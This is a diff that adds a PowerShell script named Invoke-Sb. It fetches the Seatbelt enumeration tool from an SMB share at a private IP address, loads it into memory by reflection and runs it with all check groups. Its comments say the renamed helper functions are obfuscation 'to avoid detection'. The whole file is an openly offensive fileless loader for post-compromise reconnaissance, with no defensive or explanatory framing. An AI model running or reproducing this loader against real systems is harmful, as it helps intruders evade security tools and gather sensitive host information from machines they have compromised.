@@ -1,0 +1,43 @@
+function Invoke-Sb {
+    param (
+        [string]$SMBPath = "\\192.168.29.188\share\sb.exe",
+        [string[]]$Arguments = @("-group=all")
+    )
+
+    # Obfuscation - Convert PowerShell commands into encoded format
+    $LoadFunction = @"
+function L0ad-N3tB1n {
+    param ([string]`$Path)
+    return [System.IO.File]::ReadAllBytes(`$Path)
+}
+"@
+    
+    # Execute the obfuscated loading function
+    Invoke-Expression $LoadFunction
+    $SeatbeltBytes = L0ad-N3tB1n $SMBPath
+
+    # Load Seatbelt as an Assembly from SMB
+    $Assembly = [System.Reflection.Assembly]::Load($SeatbeltBytes)
+
+    # Get Entry Point (Main Method)
+    $EntryPoint = $Assembly.EntryPoint
+
+    # Obfuscate execution to avoid detection
+    $ExecFunction = @"
+function RUn-N3tB1n {
+    param (`$Entry, `$Args)
+    `$Entry.Invoke(`$null, @(,`$Args))
+}
+"@
+    
+    Invoke-Expression $ExecFunction
+
+    # Execute Seatbelt in memory
+    Write-Host "[INFO] Running Seatbelt from SMB share in memory..."
+    RUn-N3tB1n $EntryPoint $Arguments
+
+    Write-Host "[INFO] Seatbelt execution completed!" -ForegroundColor Green
+}
+
+# Run the function with default arguments
+Invoke-Sb -SMBPath "\\192.168.29.188\share\sb.exe" -Arguments @("-group=all")
